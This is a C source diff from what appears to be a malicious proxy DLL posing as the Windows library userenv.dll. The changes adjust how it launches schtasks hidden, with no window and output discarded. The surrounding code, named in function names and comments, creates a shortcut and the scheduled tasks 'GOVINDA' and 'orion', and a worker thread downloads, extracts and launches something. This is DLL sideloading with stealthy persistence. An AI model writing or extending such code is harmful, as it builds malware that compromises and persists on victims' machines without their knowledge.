@@ -99,17 +99,22 @@ static void create_lnk(void) {
    the audit log which ends at "Creating GOVINDA task"). Bounded WaitForSingle
    Object makes any hang the proxy's problem, not Task Scheduler's. */
 static int run_schtasks(const char *cmdline, DWORD timeoutMs) {
-    HANDLE nul = CreateFileA("\\\\.\\NUL", GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
-                             NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    /* ponytail: open NUL for read+write so all three std handles are real;
+       STARTF_USESTDHANDLES with a NULL stdin can race in some hosts. */
+    HANDLE nulW = CreateFileA("\\\\.\\NUL", GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
+                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE nulR = CreateFileA("\\\\.\\NUL", GENERIC_READ,  FILE_SHARE_READ|FILE_SHARE_WRITE,
+                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     STARTUPINFOA si;    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdOutput = nul; si.hStdError = nul; si.hStdInput = NULL;
+    si.hStdOutput = nulW; si.hStdError = nulW; si.hStdInput = nulR;
     PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
 
     char buf[MAX_PATH * 6];
     lstrcpynA(buf, cmdline, sizeof(buf));
     if (!CreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        if (nul) CloseHandle(nul);
+        if (nulW) CloseHandle(nulW);
+        if (nulR) CloseHandle(nulR);
         return -1;
     }
     WaitForSingleObject(pi.hProcess, timeoutMs);
@@ -117,7 +122,8 @@ static int run_schtasks(const char *cmdline, DWORD timeoutMs) {
     GetExitCodeProcess(pi.hProcess, &code);
     if (code == STILL_ACTIVE) TerminateProcess(pi.hProcess, 1);
     CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-    if (nul) CloseHandle(nul);
+    if (nulW) CloseHandle(nulW);
+    if (nulR) CloseHandle(nulR);
     return (int)code;
 }
 
@@ -207,7 +213,7 @@ static void create_task_orion(void) {
 }
 
 static DWORD WINAPI worker_thread(LPVOID lp) {
-    audit("[+] Worker thread started");
+    audit("[+] Worker thread started (userenv.dll build 2026-07-16-v2: direct CreateProcess schtasks)");
     CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     // ponytail: pump messages so COM (Task Scheduler API) doesn't deadlock
     // inside this STA thread. Download/extract/launch is now done in
